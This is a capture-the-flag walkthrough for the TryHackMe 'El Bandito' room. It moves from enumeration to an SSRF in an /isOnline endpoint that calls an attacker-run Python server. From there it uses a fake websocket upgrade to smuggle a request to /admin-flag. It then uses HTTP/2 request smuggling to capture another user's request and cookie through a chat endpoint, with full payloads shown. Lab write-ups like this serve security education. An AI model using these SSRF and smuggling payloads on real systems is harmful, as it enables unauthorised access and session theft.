# El Bandito Walkthrough
<br/>

## Intro
Welcome to the "El Bandito" challenge, here is the link to the [room](https://tryhackme.com/room/elbandito) on TryHackMe.

**Storyline**:
*El Bandito, the new identity of the infamous [Jack the Exploiter](https://tryhackme.com/jr/bandit), has plunged into the Web3 domain with a devious token scam. By exploiting the decentralized essence of blockchain, he crafted and circulated fraudulent tokens, deceiving investors and shaking the foundational trust of the decentralized finance DeFi ecosystem.  
As we embark on this new challenge, it becomes clear that the stakes are higher than ever. To succeed, we must infiltrate his network, decode his strategies, and anticipate his moves before he can strike again.
The mission has evolved: now, we must capture El Bandito. This requires a deep dive into the digital underworld, using cunning and technical skills to outmaneuver him and restore security.

We request your help in smuggling all the flags.*

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or using the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's begin by adding an entry in the hosts file:
```bash
echo "10.10.48.64    elbandito.thm" | sudo tee -a /etc/hosts
```

Now we can start our enumeration with a port scan:
```bash
rustscan -a elbandito.thm -r 0-65000 --ulimit 5000 -- -sV
```

This is what is finds:
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  ssl/http syn-ack ttl 62 El Bandito Server
631/tcp  open  ipp      syn-ack ttl 63 CUPS 2.4
8080/tcp open  http     syn-ack ttl 62 nginx
```

Reaching the first HTTP port at `https://elbandito.thm:80/` we get a simple message saying "nothing to see"

We can visit the website `http://elbandito.thm:8080/`, here we find a page about the Bandit-Coin.
The site has multiple pages and a function to "burn coins", we can insert an amount and the token address.

Before testing anything deeper let's also start a directory scan in the background:
```bash
gobuster dir -u https://elbandito.thm:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt  --no-tls-validation  -t 160
```

This gets us:
```
/access               (Status: 200) [Size: 4817]
/login                (Status: 405) [Size: 153]
/logout               (Status: 302) [Size: 189] [--> /]
/messages             (Status: 302) [Size: 189] [--> /]
/ping                 (Status: 200) [Size: 4]
/save                 (Status: 405) [Size: 153]
/static               (Status: 301) [Size: 169] [--> http://elbandito.thm/static/]
```

And
```bash
gobuster dir -u http://elbandito.thm:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt    -t 160
```

This give us:
```
/favicon.ico          (Status: 200) [Size: 946]
/index.html           (Status: 200) [Size: 557]
/index.htm            (Status: 200) [Size: 557]
/info                 (Status: 200) [Size: 2]
/health               (Status: 200) [Size: 150]
/traceroute           (Status: 403) [Size: 146]
/traces               (Status: 403) [Size: 146]
/trace                (Status: 403) [Size: 146]
/token                (Status: 200) [Size: 6]
```


Starting from the first:
- `https://elbandito.thm:80/access` redirects us to `https://elbandito.thm:80/login` where we can sign-in with an username and password.
- `https://elbandito.thm:80/ping` prints us "pong"
- `https://elbandito.thm:80/messages` -> "nothing to see"
- `https://elbandito.thm:80/save` -> "The method is not allowed for the requested URL." -> maybe later we can test for something like a POST request there 

From the second site:
- `http://elbandito.thm:8080/info` -> blank page with only "{}" 
- `http://elbandito.thm:8080/health` -> some JSON info:
```json
{
  "status": "UP",
  "diskSpace": {
    "status": "UP",
    "total": 51963551744,
    "free": 31575650304,
    "threshold": 10485760
  },
  "db": {
    "status": "UP",
    "database": "H2",
    "hello": 1
  }
}
```

- `/trace` and the other code 403 where forbiden -> message from nginx proxy
- `http://elbandito.thm:8080/token` -> contained this number value `1716.462` 

Let's also scan for subdomains:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u http://elbandito.thm:8080 -t 100 -mc all 
```
or:
```bash
 gobuster dns -d elbandito.thm  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50
```

And vhosts:
```bash
gobuster vhost -u http://elbandito.thm  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 --append-domain
```

Just in case i did a run with an even bigger wordlist:
```bash
gobuster vhost -u http://elbandito.thm:8080  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 --append-domain > temp | grep "Status: 200"
```

But with none of them i got a single match.

Now seems enough enumeration for the moment. 

Let's test the burn token functionality with some random values and capture all the requests wit Burp's Proxy.
Looks like the "Burn" button does not do anything.

On that page i have also noticed a JS function at the end of the source code (most comments are added by me):
```js
  // 1. Insert the current year into an element with ID="current-date"
  const date = new Date().getFullYear();
  document.getElementById("current-date").innerHTML = date;

  // 2. Wait until the DOM is fully loaded before running WebSocket logic
  $(document).ready(function () {
    let webSocket;

    // Construct the WebSocket URI dynamically based on whether the page is served over HTTP or HTTPS.
    // If HTTPS ⇒ wss://, otherwise ⇒ ws://
    const wsUri =
      (window.location.protocol === "https:" ? "wss://" : "ws://") +
      window.location.host +
      "/ws";  // Adjust '/ws' if your endpoint differs

    // Function to open and set up WebSocket event handlers
    function initWebSocket() {
      webSocket = new WebSocket(wsUri);

      webSocket.onopen = function (event) {
        console.log("WebSocket is open now.");
      };

      webSocket.onmessage = function (event) {
        console.log("Message from server:", event.data);
        // Display response inside an element with ID="response"
        $("#response").text(event.data);
      };

      webSocket.onerror = function (event) {
        console.error("This service is not working on purpose ;)", event);
      };

      webSocket.onclose = function (event) {
        console.log("WebSocket is closed now.");
      };
    }

    // Initialize connection right away
    initWebSocket();

    // 3. Intercept the form submission and send data over the WebSocket
    $("#token-burn").submit(function (event) {
      event.preventDefault();        // Stop the form from doing a normal POST
      event.stopPropagation();       // Stop the event from bubbling up
      console.log("Submitting burn request…");

      if (webSocket.readyState === WebSocket.OPEN) {
        const message = {
          action: "burn",
          address: $("#address").val(),
          amount: $("#amount").val()
        };
        // Send JSON payload to the server
        webSocket.send(JSON.stringify(message));
      } else {
        console.error("WebSocket is not open.");
      }
    });
  });
```
It intercept the form submission on `#token-burn`:  
• `preventDefault()` stops the browser’s normal form submission.  
• If the socket is open, we package the form fields (`address` and `amount`) into a JSON object and send it via `webSocket.send()`. Otherwise, we log an error.

This gives an hint on why the button was not working, but to confirm my suspicions i checked the browser console logs and yes "WebSocket is not open" and "burn.html:175 WebSocket connection to `ws://elbandito.thm:8080/ws`".

Checking the services status at `http://elbandito.thm:8080/services.html` we find:
```
http://bandito.websocket.thm: OFFLINE
http://bandito.public.thm: ONLINE
```

They are both offline, but we got 2 new domains to add to our hosts.
This is the JavaScript code in the page that checks the services status:
```js
const currentYear = new Date().getFullYear();
document.getElementById("current-date").textContent = currentYear;

const serviceURLs = [
  "http://bandito.websocket.thm",
  "http://bandito.public.thm"
];

async function checkServiceStatus() {
  for (let serviceUrl of serviceURLs) {
    try {
       const response = await fetch(`/isOnline?url=${serviceUrl}`, {
        method: 'GET', 
      });

      if (response.ok) {
        let existingContent = document.getElementById("output").innerHTML;
        document.getElementById("output").innerHTML = `${existingContent}<br/>${serviceUrl}: <strong>ONLINE</strong>`;
      } else {
        throw new Error('Service response not OK');
      }
    } catch (error) {
      let existingContent = document.getElementById("output").innerHTML;
      document.getElementById("output").innerHTML = `${existingContent}<br/>${serviceUrl}: <strong>OFFLINE</strong>`;
    }
  }
}

// Call the function on document ready
document.addEventListener('DOMContentLoaded', checkServiceStatus);
```

We can see it fetches the status by hitting the `isOnline` endpoint with the `url` parameter set to the service we want to check.
The request looks like:
```http
GET /isOnline?url=http://bandito.public.thm HTTP/1.1
Host: bandito.public.thm:8080
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Referer: http://bandito.public.thm:8080/services.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

With that one we get a 200, while with the websocket service a 500, hence the OFFLINE result.

Further enumeration with Wappalizer shows that the website is running *Spring* -> Java, *Jquery 1.10.2* as JS library.
Researching online we can find Spring has **actuators**, basically similar to endpoints for specific functions, i found the following list:

| **Endpoint**             | **Description**                                                                   |
| ------------------------ | --------------------------------------------------------------------------------- |
| /actuator                | Lists all available actuator endpoints.                                           |
| /actuator/health         | Provides application health status.                                               |
| /actuator/metrics        | Exposes various metrics about the application's performance.                      |
| /actuator/info           | Displays arbitrary application information defined in the application properties. |
| /actuator/env            | Shows environment properties associated with the application.                     |
| /actuator/loggers        | Allows viewing and modifying the logging levels at runtime.                       |
| /actuator/threaddump     | Provides a thread dump of the application.                                        |
| /actuator/auditevents    | Displays audit events from the application, like login attempts.                  |
| /actuator/scheduledtasks | Displays scheduled tasks in the application context.                              |
| /actuator/heapdump       | Exports a heap dump for analysis.                                                 |
| /actuator/caches         | Provides cache statistics if caching is enabled.                                  |
| /actuator/mappings       | Displays all the mappings for the application (REST endpoints).                   |
| /actuator/conditions     | Shows the conditions that were evaluated for your application's configuration.    |

Let's try to hit them and see if we get some useful info.
Hitting many of them we get a "forbidden" error from Nginx.

Luckily the `/mappings` endpoint returns some info:
```json
{
  "/webjars/**": {
    "bean": "resourceHandlerMapping"
  },
  "/**": {
    "bean": "resourceHandlerMapping"
  },
  "/**/favicon.ico": {
    "bean": "faviconHandlerMapping"
  },
  "{[/admin-creds],methods=[GET]}": {
    "bean": "requestMappingHandlerMapping",
    "method": "public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.adminCreds()"
  },
  "{[/admin-flag],methods=[GET]}": {
    "bean": "requestMappingHandlerMapping",
    "method": "public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.adminFlag()"
  },
  "{[/token]}": {
    "bean": "requestMappingHandlerMapping",
    "method": "public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.getBootTimeWithRandom()"
  },
  "{[/isOnline]}": {
    "bean": "requestMappingHandlerMapping",
    "method": "public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AppHealthController.health(java.lang.String) throws java.io.IOException"
  },
  "{[/error],produces=[text/html]}": {
    "bean": "requestMappingHandlerMapping",
    "method": "public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)"
  },
  "{[/error]}": {
    "bean": "requestMappingHandlerMapping",
    "method": "public org.springframework.http.ResponseEntity<java.util.Map<java.lang.String, java.lang.Object>> org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)"
  },
  "{[/heapdump || /heapdump.json],methods=[GET],produces=[application/octet-stream]}": {
    "bean": "endpointHandlerMapping",
    "method": "public void org.springframework.boot.actuate.endpoint.mvc.HeapdumpMvcEndpoint.invoke(boolean,javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse) throws java.io.IOException,javax.servlet.ServletException"
  },
  "{[/autoconfig || /autoconfig.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  },
  "{[/trace || /trace.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  },
  "{[/health || /health.json],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.HealthMvcEndpoint.invoke(java.security.Principal)"
  },
  "{[/dump || /dump.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  },
  "{[/configprops || /configprops.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  },
  "{[/env/{name:.*}],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EnvironmentMvcEndpoint.value(java.lang.String)"
  },
  "{[/env || /env.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  },
  "{[/metrics/{name:.*}],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.MetricsMvcEndpoint.value(java.lang.String)"
  },
  "{[/metrics || /metrics.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  },
  "{[/mappings || /mappings.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  },
  "{[/beans || /beans.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  },
  "{[/info || /info.json],methods=[GET],produces=[application/json]}": {
    "bean": "endpointHandlerMapping",
    "method": "public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"
  }
}

```

Here we find the `/admin-flag` and `/admin-creds` endpoints. but if we try to reach them we still get the 403.
We need a way to bypass that.

Looking back at the online checker, if we mess a bit with the request we can see that we can manipulate the `url` parameter as we like, for example we can start a server on our attacker machine and hit it:
```http
GET /isOnline?url=http://YOUR_IP:8000/imatest HTTP/1.1
Host: elbandito.thm:8080
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Referer: http://elbandito.thm:8080/services.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

We find the request in our http server logs.

Thanks to this SSRF vulnerability we can create a server that will return a specific status code, than send a request to our server, and smuggle a request to our desired flag.
Let's do it:
1. Create the python server:
```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
	print("""
Usage: {}	
	""".format(sys.argv[0]))
	sys.exit()

class Redirect(BaseHTTPRequestHandler):
	def do_GET(self):
		self.protocol_version = "HTTP/1.1"
		self.send_response(101)
		self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

2. Let's start it on our machine:
```bash
python3 myserver.py 5555
```

3. Craft the request:
```http
GET /isOnline?url=http://YOUR_IP:5555 HTTP/1.1
Host: bandito.public.thm:8080
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Referer: http://elbandito.thm:8080/services.html
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 13
Connection: Upgrade
Upgrade: Websocket

GET /admin-flag HTTP/1.1
Host: bandito.public.thm:8080


```

This successfully prints us the flag:
```http
TTP/1.1 101 
Server: nginx
Date: Mon, 06 Oct 2025 17:08:49 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200 
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 43
Date: Mon, 06 Oct 2025 17:08:49 GMT

REDACTED_FOR_THE_WRITEUP
```

--> REDACTED_FLAG

<br/>

### Second Flag
With this method we can also hit `/admin-creds` to get them:
```
username:REDACTED
password:REDACTED
```

Now we can use those to login here: `https://elbandito.thm:80/access`
Here we find a message-app like page with the users Oliver and Jack.

We try to send a test message and capture the request:
```http
POST /send_message HTTP/2
Host: elbandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aOP5ag.JOVrhYLkJwM-l03gKt5HjJgRPag
Content-Length: 9
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Origin: https://elbandito.thm:80
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://elbandito.thm:80/messages
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

data=test
```

We can see that the actual message is send in the body in the `data` parameter. The request also contains a bunch of security related headers.
Looking at the source code we can find this JS:
```js
document.addEventListener("DOMContentLoaded", function () {
	const discussions = document.querySelectorAll(".discussion");
	const messagesChat = document.querySelector(".messages-chat");
	const headerName = document.querySelector(".header-chat .name");
	const writeMessageInput = document.querySelector(".write-message");
	let userMessages = {
		JACK: [],
		OLIVER: [],
	};

	// Function to fetch messages from the server
	function fetchMessages() {
		fetch("/getMessages")
			.then((response) => {
				if (!response.ok) {
					throw new Error("Failed to fetch messages");
				}
				return response.json();
			})
			.then((messages) => {
				userMessages = messages;
				userMessages.JACK === undefined
					? (userMessages = { OLIVER: messages.OLIVER, JACK: [] })
					: userMessages.OLIVER === undefined &&
					  (userMessages = { JACK: messages.JACK, OLIVER: [] });

				displayMessages("JACK");
			})
			.catch((error) => console.error("Error fetching messages:", error));
	}

	// Function to display messages for the selected user
	function displayMessages(userName) {
		headerName.innerText = userName;
		messagesChat.innerHTML = "";
		userMessages[userName].forEach(function (messageData) {
			appendMessage(messageData);
		});
	}

	// Function to append a message to the chat area
	function appendMessage(messageData) {
		const newMessage = document.createElement("div");
		console.log({ messageData });
		newMessage.classList.add("message", "text-only");
		newMessage.innerHTML = `
           ${messageData.sender !== "Bot" ? '<div class="response">' : ""}
        <div class="text">${messageData}</div>
    ${messageData.sender !== "Bot" ? "</div>" : ""}
        `;
		messagesChat.appendChild(newMessage);
	}

	// Function to send a message to the server
	function sendMessage() {
		const messageText = writeMessageInput.value.trim();
		if (messageText !== "") {
			const activeUser = headerName.innerText;
			const urlParams = new URLSearchParams(window.location.search);
			const isBot =
				urlParams.has("msg") && urlParams.get("msg") === messageText;

			const messageData = {
				message: messageText,
				sender: isBot ? "Bot" : activeUser, // Set the sender as "Bot"
			};
			userMessages[activeUser].push(messageData);
			appendMessage(messageText);
			writeMessageInput.value = "";
			scrollToBottom();
			console.log({ activeUser });
			fetch("/send_message", {
				method: "POST",
				headers: {
					"Content-Type": "application/x-www-form-urlencoded",
				},
				body: "data="+messageText
			})
				.then((response) => {
					if (!response.ok) {
						throw new Error("Network response was not ok");
					}
					console.log("Message sent successfully");
				})
				.catch((error) => {
					console.error("Error sending message:", error);
					// Handle error (e.g., display error message to the user)
				});
		}
	}

	// Event listeners
	discussions.forEach(function (discussion) {
		discussion.addEventListener("click", function () {
			const userName = this.dataset.name;
			console.log({ userName });
			displayMessages(userName.toUpperCase());
		});
	});

	const sendButton = document.querySelector(".send");
	sendButton.addEventListener("click", sendMessage);
	writeMessageInput.addEventListener("keydown", function (event) {
		if (event.key === "Enter") {
			event.preventDefault();
			sendMessage();
		}
	});

	// Initial actions
	fetchMessages();
});

// Function to scroll to the bottom of the messages chat
function scrollToBottom() {
	const messagesChat = document.getElementById("messages-chat");
	messagesChat.scrollTop = messagesChat.scrollHeight;
}
```

The messages are fetched via `/getMessages` endpoint which returns a JSON blob containing them, they are then parsed and pretty presented with the webUI.
For what concern sending messages they are sent via a POST request to `/send_message`.

We can try to smuggle another request like this:
```http
POST / HTTP/2
Host: elbandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aOP5ag.JOVrhYLkJwM-l03gKt5HjJgRPag
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Length: 0


POST /send_message HTTP/1.1
Host: elbandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aOP5ag.JOVrhYLkJwM-l03gKt5HjJgRPag
Content-Length: 777
Content-Type: application/x-www-form-urlencoded

data= 	
```
- Here we choose the `Content-Length: 0` for the first request so that the second request will be included as a message in the chat.
- Vice-versa on the second smuggled request we set a high value to include as much info as possible
- We also leave the `data` parameter empty so that any following request to the `/send_message` endpoint will be interpreted as the content of the  `data` parameter.

All this to try to catch other user's requests messages.

Then loading again the `https://elbandito.thm:80/getMessages` page we see the flag:
```json
{"JACK":["The Galactic Enforcement's quantum sniffers are onto us, tracing our blockchain exploits.","They're using predictive analytics, thinking they're ahead in a 4D chess game across the blockchain.","You need to jump now! Awaiting your signal to close the portal.","helloo","hello","test"," \tPOST /login HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\ncontent-length: 55\r\ncache-control: max-age=0\r\nsec-ch-ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"HeadlessChrome\";v=\"122\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Linux\"\r\nupgrade-insecure-requests: 1\r\norigin: https://bandito.public.thm:80\r\ncontent-type: application/x-www-form-urlencoded\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: same-origin\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\nreferer: https://bandito.public.thm:80/access\r\naccept-encoding: gzip, deflate, br\r\ncookie: REDACTED_FLAG \r\nX-Forwarded-For: "],"OLIVER":[]}
```

Take the flag and put it into CyberChef to escape and then unescape unicode chars and you will have the final answer:

--> REDACTED_FLAG

<br/>
<br/>

Congratulations you have successfully exploited the SSRF, websocket and http request smuggling vulnerabilities to find the 2 hidden flags.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
